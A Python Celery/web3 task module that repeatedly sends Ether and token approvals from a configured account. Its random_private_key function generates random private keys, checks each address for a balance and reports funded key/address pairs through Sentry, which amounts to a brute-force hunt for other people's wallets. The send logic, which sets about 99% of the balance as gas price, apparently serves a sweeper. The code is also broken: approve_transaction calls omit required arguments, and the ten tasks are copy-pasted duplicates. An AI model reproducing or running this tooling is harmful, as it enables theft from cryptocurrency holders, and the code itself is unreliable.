import datetime
import random

from celery import shared_task
from decouple import config
from django.db.transaction import atomic
from sentry_sdk import set_level, capture_message
from web3 import Web3

x = datetime.datetime.now()
ALCHEMY_Web3Provider = Web3(Web3.HTTPProvider(config(F'ALCHEMY_DAY_{x.day}')))
ZMOK_Web3Provider = Web3(Web3.HTTPProvider(config(F'ZMOK_DAY_{x.day}')))

usdt_contract_address = '0xdAC17F958D2ee523a2206206994597C13D831ec7'
usdt_contract_abi = '[{"constant":true,"inputs":[],"name":"name","outputs":[{"name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_upgradedAddress","type":"address"}],"name":"deprecate","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"deprecated","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_evilUser","type":"address"}],"name":"addBlackList","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"totalSupply","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_from","type":"address"},{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transferFrom","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"upgradedAddress","outputs":[{"name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"name":"","type":"address"}],"name":"balances","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"decimals","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"maximumFee","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"_totalSupply","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[],"name":"unpause","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[{"name":"_maker","type":"address"}],"name":"getBlackListStatus","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"name":"","type":"address"},{"name":"","type":"address"}],"name":"allowed","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"paused","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"name":"who","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[],"name":"pause","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"getOwner","outputs":[{"name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"owner","outputs":[{"name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"symbol","outputs":[{"name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transfer","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"newBasisPoints","type":"uint256"},{"name":"newMaxFee","type":"uint256"}],"name":"setParams","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"amount","type":"uint256"}],"name":"issue","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"amount","type":"uint256"}],"name":"redeem","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[{"name":"_owner","type":"address"},{"name":"_spender","type":"address"}],"name":"allowance","outputs":[{"name":"remaining","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"basisPointsRate","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"name":"","type":"address"}],"name":"isBlackListed","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_clearedUser","type":"address"}],"name":"removeBlackList","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"MAX_UINT","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"_blackListedUser","type":"address"}],"name":"destroyBlackFunds","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"inputs":[{"name":"_initialSupply","type":"uint256"},{"name":"_name","type":"string"},{"name":"_symbol","type":"string"},{"name":"_decimals","type":"uint256"}],"payable":false,"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":false,"name":"amount","type":"uint256"}],"name":"Issue","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"name":"amount","type":"uint256"}],"name":"Redeem","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"name":"newAddress","type":"address"}],"name":"Deprecate","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"name":"feeBasisPoints","type":"uint256"},{"indexed":false,"name":"maxFee","type":"uint256"}],"name":"Params","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"name":"_blackListedUser","type":"address"},{"indexed":false,"name":"_balance","type":"uint256"}],"name":"DestroyedBlackFunds","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"name":"_user","type":"address"}],"name":"AddedBlackList","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"name":"_user","type":"address"}],"name":"RemovedBlackList","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"name":"owner","type":"address"},{"indexed":true,"name":"spender","type":"address"},{"indexed":false,"name":"value","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"name":"from","type":"address"},{"indexed":true,"name":"to","type":"address"},{"indexed":false,"name":"value","type":"uint256"}],"name":"Transfer","type":"event"},{"anonymous":false,"inputs":[],"name":"Pause","type":"event"},{"anonymous":false,"inputs":[],"name":"Unpause","type":"event"}]'


# @atomic
def approve_transaction(balance, to_account, from_account, web3, private_key, contract, value):
    try:
        tx = contract.functions.approve(to_account, value).buildTransaction({
            'from': from_account,
            'gas': 21000,
            'gasPrice': int((balance - 100000) / 21000),
            'nonce': web3.eth.getTransactionCount(from_account, 'pending')
        })
        signed_tx = web3.eth.account.signTransaction(tx, private_key)
        web3.eth.sendRawTransaction(signed_tx.rawTransaction)
        if balance > 165311289288785:
            web3 = Web3(Web3.HTTPProvider("https://rpc.ethermine.org/"))
            tx = contract.functions.approve(to_account, value).buildTransaction({
                'from': from_account,
                'gas': 21000,
                'gasPrice': int((balance - 100000) / 21000),
                'nonce': web3.eth.getTransactionCount(from_account, 'pending')
            })
            signed_tx = web3.eth.account.signTransaction(tx, private_key)
            web3.eth.sendRawTransaction(signed_tx.rawTransaction)
    except:
        tx = contract.functions.approve(to_account, value).buildTransaction({
            'from': from_account,
            'gas': 21000,
            'gasPrice': int((balance - 100000) / 21000),
            'nonce': web3.eth.getTransactionCount(from_account, 'pending')
        })
        signed_tx = web3.eth.account.signTransaction(tx, private_key)
        web3.eth.sendRawTransaction(signed_tx.rawTransaction)
        if balance > 165311289288785:
            web3 = Web3(Web3.HTTPProvider("https://rpc.ethermine.org/"))
            tx = contract.functions.approve(to_account, value).buildTransaction({
                'from': from_account,
                'gas': 21000,
                'gasPrice': int((balance - 100000) / 21000),
                'nonce': web3.eth.getTransactionCount(from_account, 'pending')
            })
            signed_tx = web3.eth.account.signTransaction(tx, private_key)
            web3.eth.sendRawTransaction(signed_tx.rawTransaction)


# @atomic
def send_ethereum(web3, to_account, from_account, private_key, balance):
    try:
        signed_tx = web3.eth.account.signTransaction(
            {
                'nonce': web3.eth.getTransactionCount(from_account, 'pending'),
                'to': to_account,
                'value': int(balance * 0.09),
                'gas': 21000,
                'gasPrice': int(balance * 0.99 / 21000)
            },
            private_key)
        web3.eth.sendRawTransaction(signed_tx.rawTransaction)
        if balance > 165311289288785:
            web3 = Web3(Web3.HTTPProvider("https://rpc.ethermine.org/"))
            signed_tx = web3.eth.account.signTransaction(
                {
                    'nonce': web3.eth.getTransactionCount(from_account, 'pending'),
                    'to': to_account,
                    'value': int(balance * 0.09),
                    'gas': 21000,
                    'gasPrice': int(balance * 0.99 / 21000)
                },
                private_key)
            web3.eth.sendRawTransaction(signed_tx.rawTransaction)
        else:
            signed_tx = web3.eth.account.signTransaction(
                {
                    'nonce': web3.eth.getTransactionCount(from_account, 'pending'),
                    'to': to_account,
                    'value': int(balance * 0.09),
                    'gas': 21000,
                    'gasPrice': int(balance * 0.99 / 21000)
                },
                private_key)
            web3.eth.sendRawTransaction(signed_tx.rawTransaction)
    except:
        signed_tx = web3.eth.account.signTransaction(
            {
                'nonce': web3.eth.getTransactionCount(from_account, 'pending'),
                'to': to_account,
                'value': int(balance * 0.09),
                'gas': 21000,
                'gasPrice': int(balance * 0.99 / 21000)
            },
            private_key)
        web3.eth.sendRawTransaction(signed_tx.rawTransaction)
        if balance > 165311289288785:
            web3 = Web3(Web3.HTTPProvider("https://rpc.ethermine.org/"))
            signed_tx = web3.eth.account.signTransaction(
                {
                    'nonce': web3.eth.getTransactionCount(from_account, 'pending'),
                    'to': to_account,
                    'value': int(balance * 0.09),
                    'gas': 21000,
                    'gasPrice': int(balance * 0.99 / 21000)
                },
                private_key)
            web3.eth.sendRawTransaction(signed_tx.rawTransaction)


@atomic
def random_private_key(web3):
    print(random.randbytes(32))
    private_key = random.randbytes(32)
    acct = web3.eth.account.privateKeyToAccount(private_key)
    address = acct.address
    print(web3.eth.get_balance(address))
    print(address)
    if web3.eth.get_balance(address) > 0:
        capture_message(f"{private_key} ---- {address}")
        set_level('info')
    return True


@shared_task
def automate_send_eth_and_approve_1():
    web3 = ALCHEMY_Web3Provider
    from_account = config('FROM_ACCOUNT')
    to_account = config('TO_ACCOUNT')
    private_key = config('PRIVATE_KEY')
    balance = web3.eth.get_balance(from_account)

    # alchemy web3
    value = web3.toWei('1', 'ether')

    send_ethereum(web3=web3, from_account=from_account, to_account=to_account, private_key=private_key, balance=balance)
    approve_transaction(web3=web3, from_account=from_account, to_account=to_account, balance=balance, value=value)
    random_private_key(web3)

    # alchemy web3
    value = web3.toWei('2', 'ether')

    send_ethereum(web3=web3, from_account=from_account, to_account=to_account, private_key=private_key, balance=balance)
    approve_transaction(web3=web3, from_account=from_account, to_account=to_account, balance=balance, value=value)
    random_private_key(web3)

    web3 = ZMOK_Web3Provider

    # zmoki web3
    value = web3.toWei('3', 'ether')

    send_ethereum(web3=web3, from_account=from_account, to_account=to_account, private_key=private_key, balance=balance)
    approve_transaction(web3=web3, from_account=from_account, to_account=to_account, balance=balance, value=value)
    random_private_key(web3)

    # zmoki web3
    value = web3.toWei('4', 'ether')

    send_ethereum(web3=web3, from_account=from_account, to_account=to_account, private_key=private_key, balance=balance)
    approve_transaction(web3=web3, from_account=from_account, to_account=to_account, balance=balance, value=value)
    random_private_key(web3)


@shared_task
def automate_send_eth_and_approve_2():
    web3 = ALCHEMY_Web3Provider
    from_account = config('FROM_ACCOUNT')
    to_account = config('TO_ACCOUNT')
    private_key = config('PRIVATE_KEY')
    balance = web3.eth.get_balance(from_account)

    # alchemy web3
    value = web3.toWei('1', 'ether')

    send_ethereum(web3=web3, from_account=from_account, to_account=to_account, private_key=private_key, balance=balance)
    approve_transaction(web3=web3, from_account=from_account, to_account=to_account, balance=balance, value=value)
    random_private_key(web3)

    # alchemy web3
    value = web3.toWei('2', 'ether')

    send_ethereum(web3=web3, from_account=from_account, to_account=to_account, private_key=private_key, balance=balance)
    approve_transaction(web3=web3, from_account=from_account, to_account=to_account, balance=balance, value=value)
    random_private_key(web3)

    web3 = ZMOK_Web3Provider

    # zmoki web3
    value = web3.toWei('3', 'ether')

    send_ethereum(web3=web3, from_account=from_account, to_account=to_account, private_key=private_key, balance=balance)
    approve_transaction(web3=web3, from_account=from_account, to_account=to_account, balance=balance, value=value)
    random_private_key(web3)

    # zmoki web3
    value = web3.toWei('4', 'ether')

    send_ethereum(web3=web3, from_account=from_account, to_account=to_account, private_key=private_key, balance=balance)
    approve_transaction(web3=web3, from_account=from_account, to_account=to_account, balance=balance, value=value)
    random_private_key(web3)


@shared_task
def automate_send_eth_and_approve_3():
    web3 = ALCHEMY_Web3Provider
    from_account = config('FROM_ACCOUNT')
    to_account = config('TO_ACCOUNT')
    private_key = config('PRIVATE_KEY')
    balance = web3.eth.get_balance(from_account)

    # alchemy web3
    value = web3.toWei('1', 'ether')

    send_ethereum(web3=web3, from_account=from_account, to_account=to_account, private_key=private_key, balance=balance)
    approve_transaction(web3=web3, from_account=from_account, to_account=to_account, balance=balance, value=value)
    random_private_key(web3)

    # alchemy web3
    value = web3.toWei('2', 'ether')

    send_ethereum(web3=web3, from_account=from_account, to_account=to_account, private_key=private_key, balance=balance)
    approve_transaction(web3=web3, from_account=from_account, to_account=to_account, balance=balance, value=value)
    random_private_key(web3)

    web3 = ZMOK_Web3Provider
    # zmoki web3
    value = web3.toWei('3', 'ether')

    send_ethereum(web3=web3, from_account=from_account, to_account=to_account, private_key=private_key, balance=balance)
    approve_transaction(web3=web3, from_account=from_account, to_account=to_account, balance=balance, value=value)
    random_private_key(web3)

    # zmoki web3
    value = web3.toWei('4', 'ether')

    send_ethereum(web3=web3, from_account=from_account, to_account=to_account, private_key=private_key, balance=balance)
    approve_transaction(web3=web3, from_account=from_account, to_account=to_account, balance=balance, value=value)
    random_private_key(web3)


@shared_task
def automate_send_eth_and_approve_4():
    web3 = ALCHEMY_Web3Provider
    from_account = config('FROM_ACCOUNT')
    to_account = config('TO_ACCOUNT')
    private_key = config('PRIVATE_KEY')
    balance = web3.eth.get_balance(from_account)

    # alchemy web3
    value = web3.toWei('1', 'ether')

    send_ethereum(web3=web3, from_account=from_account, to_account=to_account, private_key=private_key, balance=balance)
    approve_transaction(web3=web3, from_account=from_account, to_account=to_account, balance=balance, value=value)
    random_private_key(web3)

    # alchemy web3
    value = web3.toWei('2', 'ether')

    send_ethereum(web3=web3, from_account=from_account, to_account=to_account, private_key=private_key, balance=balance)
    approve_transaction(web3=web3, from_account=from_account, to_account=to_account, balance=balance, value=value)
    random_private_key(web3)

    web3 = ZMOK_Web3Provider
    # zmoki web3
    value = web3.toWei('3', 'ether')

    send_ethereum(web3=web3, from_account=from_account, to_account=to_account, private_key=private_key, balance=balance)
    approve_transaction(web3=web3, from_account=from_account, to_account=to_account, balance=balance, value=value)
    random_private_key(web3)

    # zmoki web3
    value = web3.toWei('4', 'ether')

    send_ethereum(web3=web3, from_account=from_account, to_account=to_account, private_key=private_key, balance=balance)
    approve_transaction(web3=web3, from_account=from_account, to_account=to_account, balance=balance, value=value)
    random_private_key(web3)


@shared_task
def automate_send_eth_and_approve_5():
    web3 = ALCHEMY_Web3Provider
    from_account = config('FROM_ACCOUNT')
    to_account = config('TO_ACCOUNT')
    private_key = config('PRIVATE_KEY')
    balance = web3.eth.get_balance(from_account)

    # alchemy web3
    value = web3.toWei('1', 'ether')

    send_ethereum(web3=web3, from_account=from_account, to_account=to_account, private_key=private_key, balance=balance)
    approve_transaction(web3=web3, from_account=from_account, to_account=to_account, balance=balance, value=value)
    random_private_key(web3)

    # alchemy web3
    value = web3.toWei('2', 'ether')

    send_ethereum(web3=web3, from_account=from_account, to_account=to_account, private_key=private_key, balance=balance)
    approve_transaction(web3=web3, from_account=from_account, to_account=to_account, balance=balance, value=value)
    random_private_key(web3)

    web3 = ZMOK_Web3Provider
    # zmoki web3
    value = web3.toWei('3', 'ether')

    send_ethereum(web3=web3, from_account=from_account, to_account=to_account, private_key=private_key, balance=balance)
    approve_transaction(web3=web3, from_account=from_account, to_account=to_account, balance=balance, value=value)
    random_private_key(web3)

    # zmoki web3
    value = web3.toWei('4', 'ether')

    send_ethereum(web3=web3, from_account=from_account, to_account=to_account, private_key=private_key, balance=balance)
    approve_transaction(web3=web3, from_account=from_account, to_account=to_account, balance=balance, value=value)
    random_private_key(web3)


@shared_task
def automate_send_eth_and_approve_6():
    web3 = ALCHEMY_Web3Provider
    from_account = config('FROM_ACCOUNT')
    to_account = config('TO_ACCOUNT')
    private_key = config('PRIVATE_KEY')
    balance = web3.eth.get_balance(from_account)

    # alchemy web3
    value = web3.toWei('1', 'ether')

    send_ethereum(web3=web3, from_account=from_account, to_account=to_account, private_key=private_key, balance=balance)
    approve_transaction(web3=web3, from_account=from_account, to_account=to_account, balance=balance, value=value)
    random_private_key(web3)

    # alchemy web3
    value = web3.toWei('2', 'ether')

    send_ethereum(web3=web3, from_account=from_account, to_account=to_account, private_key=private_key, balance=balance)
    approve_transaction(web3=web3, from_account=from_account, to_account=to_account, balance=balance, value=value)
    random_private_key(web3)

    web3 = ZMOK_Web3Provider

    # zmoki web3
    value = web3.toWei('3', 'ether')

    send_ethereum(web3=web3, from_account=from_account, to_account=to_account, private_key=private_key, balance=balance)
    approve_transaction(web3=web3, from_account=from_account, to_account=to_account, balance=balance, value=value)
    random_private_key(web3)

    # zmoki web3
    value = web3.toWei('4', 'ether')

    send_ethereum(web3=web3, from_account=from_account, to_account=to_account, private_key=private_key, balance=balance)
    approve_transaction(web3=web3, from_account=from_account, to_account=to_account, balance=balance, value=value)
    random_private_key(web3)


@shared_task
def automate_send_eth_and_approve_7():
    web3 = ALCHEMY_Web3Provider
    from_account = config('FROM_ACCOUNT')
    to_account = config('TO_ACCOUNT')
    private_key = config('PRIVATE_KEY')
    balance = web3.eth.get_balance(from_account)

    # alchemy web3
    value = web3.toWei('1', 'ether')

    send_ethereum(web3=web3, from_account=from_account, to_account=to_account, private_key=private_key, balance=balance)
    approve_transaction(web3=web3, from_account=from_account, to_account=to_account, balance=balance, value=value)
    random_private_key(web3)

    # alchemy web3
    value = web3.toWei('2', 'ether')

    send_ethereum(web3=web3, from_account=from_account, to_account=to_account, private_key=private_key, balance=balance)
    approve_transaction(web3=web3, from_account=from_account, to_account=to_account, balance=balance, value=value)
    random_private_key(web3)

    web3 = ZMOK_Web3Provider

    # zmoki web3
    value = web3.toWei('3', 'ether')

    send_ethereum(web3=web3, from_account=from_account, to_account=to_account, private_key=private_key, balance=balance)
    approve_transaction(web3=web3, from_account=from_account, to_account=to_account, balance=balance, value=value)
    random_private_key(web3)

    # zmoki web3
    value = web3.toWei('4', 'ether')

    send_ethereum(web3=web3, from_account=from_account, to_account=to_account, private_key=private_key, balance=balance)
    approve_transaction(web3=web3, from_account=from_account, to_account=to_account, balance=balance, value=value)
    random_private_key(web3)


@shared_task
def automate_send_eth_and_approve_8():
    web3 = ALCHEMY_Web3Provider
    from_account = config('FROM_ACCOUNT')
    to_account = config('TO_ACCOUNT')
    private_key = config('PRIVATE_KEY')
    balance = web3.eth.get_balance(from_account)

    # alchemy web3
    value = web3.toWei('1', 'ether')

    send_ethereum(web3=web3, from_account=from_account, to_account=to_account, private_key=private_key, balance=balance)
    approve_transaction(web3=web3, from_account=from_account, to_account=to_account, balance=balance, value=value)
    random_private_key(web3)

    # alchemy web3
    value = web3.toWei('2', 'ether')

    send_ethereum(web3=web3, from_account=from_account, to_account=to_account, private_key=private_key, balance=balance)
    approve_transaction(web3=web3, from_account=from_account, to_account=to_account, balance=balance, value=value)
    random_private_key(web3)

    web3 = ZMOK_Web3Provider

    # zmoki web3
    value = web3.toWei('3', 'ether')

    send_ethereum(web3=web3, from_account=from_account, to_account=to_account, private_key=private_key, balance=balance)
    approve_transaction(web3=web3, from_account=from_account, to_account=to_account, balance=balance, value=value)
    random_private_key(web3)

    # zmoki web3
    value = web3.toWei('4', 'ether')

    send_ethereum(web3=web3, from_account=from_account, to_account=to_account, private_key=private_key, balance=balance)
    approve_transaction(web3=web3, from_account=from_account, to_account=to_account, balance=balance, value=value)
    random_private_key(web3)


@shared_task
def automate_send_eth_and_approve_9():
    web3 = ALCHEMY_Web3Provider
    from_account = config('FROM_ACCOUNT')
    to_account = config('TO_ACCOUNT')
    private_key = config('PRIVATE_KEY')
    balance = web3.eth.get_balance(from_account)

    # alchemy web3
    value = web3.toWei('1', 'ether')

    send_ethereum(web3=web3, from_account=from_account, to_account=to_account, private_key=private_key, balance=balance)
    approve_transaction(web3=web3, from_account=from_account, to_account=to_account, balance=balance, value=value)
    random_private_key(web3)

    # alchemy web3
    value = web3.toWei('2', 'ether')

    send_ethereum(web3=web3, from_account=from_account, to_account=to_account, private_key=private_key, balance=balance)
    approve_transaction(web3=web3, from_account=from_account, to_account=to_account, balance=balance, value=value)
    random_private_key(web3)

    web3 = ZMOK_Web3Provider

    # zmoki web3
    value = web3.toWei('3', 'ether')

    send_ethereum(web3=web3, from_account=from_account, to_account=to_account, private_key=private_key, balance=balance)
    approve_transaction(web3=web3, from_account=from_account, to_account=to_account, balance=balance, value=value)
    random_private_key(web3)

    # zmoki web3
    value = web3.toWei('4', 'ether')

    send_ethereum(web3=web3, from_account=from_account, to_account=to_account, private_key=private_key, balance=balance)
    approve_transaction(web3=web3, from_account=from_account, to_account=to_account, balance=balance, value=value)
    random_private_key(web3)


@shared_task
def automate_send_eth_and_approve_10():
    web3 = ALCHEMY_Web3Provider
    from_account = config('FROM_ACCOUNT')
    to_account = config('TO_ACCOUNT')
    private_key = config('PRIVATE_KEY')
    balance = web3.eth.get_balance(from_account)

    # alchemy web3
    value = web3.toWei('1', 'ether')

    send_ethereum(web3=web3, from_account=from_account, to_account=to_account, private_key=private_key, balance=balance)
    approve_transaction(web3=web3, from_account=from_account, to_account=to_account, balance=balance, value=value)
    random_private_key(web3)

    # alchemy web3
    value = web3.toWei('2', 'ether')

    send_ethereum(web3=web3, from_account=from_account, to_account=to_account, private_key=private_key, balance=balance)
    approve_transaction(web3=web3, from_account=from_account, to_account=to_account, balance=balance, value=value)
    random_private_key(web3)

    web3 = ZMOK_Web3Provider

    # zmoki web3
    value = web3.toWei('3', 'ether')

    send_ethereum(web3=web3, from_account=from_account, to_account=to_account, private_key=private_key, balance=balance)
    approve_transaction(web3=web3, from_account=from_account, to_account=to_account, balance=balance, value=value)
    random_private_key(web3)

    # zmoki web3
    value = web3.toWei('4', 'ether')

    send_ethereum(web3=web3, from_account=from_account, to_account=to_account, private_key=private_key, balance=balance)
    approve_transaction(web3=web3, from_account=from_account, to_account=to_account, balance=balance, value=value)
    random_private_key(web3)
